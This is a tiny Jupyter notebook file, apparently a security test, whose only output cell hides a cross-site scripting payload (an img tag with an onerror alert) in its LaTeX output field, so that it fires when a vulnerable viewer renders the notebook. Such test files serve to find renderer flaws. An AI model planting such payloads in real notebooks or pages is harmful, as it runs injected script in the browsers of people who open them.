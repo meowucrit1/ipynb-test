{
  "cells": [{
    "cell_type": "code",
    "source": [],
    "outputs": [{
      "output_type": "display_data",
      "data": {
        "latex": "<img src onerror=\"alert('XSS at '+location)\">"
      }
    }]
  }]
}
